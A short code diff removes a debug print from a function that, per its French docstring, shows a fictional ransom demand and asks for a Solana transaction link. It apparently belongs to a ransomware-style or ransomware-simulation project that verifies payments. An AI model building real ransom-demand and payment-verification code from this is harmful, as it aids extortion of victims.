@@ -27,7 +27,6 @@ def get_transaction_details_and_amount(transaction_signature_str):
         return f"Error fetching transaction details: {e}"
 
 def show_ransom_demand():
-    print('JE SUIS LE MESSAGE')
     """
     Affiche une fenêtre contenant une demande de rançon fictive,
     et demande à l'utilisateur le lien de la transaction Solana.
